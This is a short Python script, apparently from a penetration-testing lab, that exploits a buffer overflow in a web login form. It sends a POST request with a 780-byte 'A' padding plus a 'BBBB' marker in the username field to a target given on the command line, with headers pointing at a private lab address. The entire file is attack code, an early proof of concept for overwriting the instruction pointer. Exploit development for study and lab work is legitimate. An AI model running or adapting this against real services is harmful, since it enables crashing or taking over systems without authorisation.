#!/usr/bin/python
import socket, sys

if len(sys.argv) != 3:
    print("Modo de uso: python ag_bufferoverflow2.py <IP> <Port>")
    sys.exit()

target = sys.argv[1]
port = sys.argv[2]

data = "A" * 780 + "BBBB"
size = len(data) + len("username=&password=A")

request="POST /login HTTP/1.1\r\n"
request+="Host: 172.20.20.11\r\n"
request+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
request+="Accept-Language: en-US,en;q=0.5\r\n"
request+="Accept-Encoding: gzip, deflate\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
request+="Content-Length: "+str(size)+"\r\n"
request+="Origin: http://172.20.20.11\r\n"
request+="Connection: close\r\n"
request+="Referer: http://172.20.20.11/login\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="\r\n"
request+="username="+data+"&password=A"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target,int(port)))
s.send(request)